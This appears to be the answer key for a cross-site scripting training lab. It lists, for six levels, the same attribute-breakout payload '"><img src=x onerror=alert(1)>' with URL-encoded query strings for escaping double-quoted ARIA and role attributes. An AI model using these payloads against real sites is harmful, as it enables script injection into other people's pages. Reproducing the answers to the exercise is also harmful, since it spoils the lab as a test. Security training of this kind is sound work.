# ariaattr — solutions

Reflection inside double-quoted ARIA attributes; break out of the attribute then add an event handler.

### ariaattr-level1

`/ariaattr/level1/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside aria-label="…" — break out and inject tag

### ariaattr-level2

`/ariaattr/level2/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside aria-describedby="…"

### ariaattr-level3

`/ariaattr/level3/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside aria-atomic="…"

### ariaattr-level4

`/ariaattr/level4/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside aria-hidden="…"

### ariaattr-level5

`/ariaattr/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside nav aria-label="…"

### ariaattr-level6

`/ariaattr/level6/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside role="…"
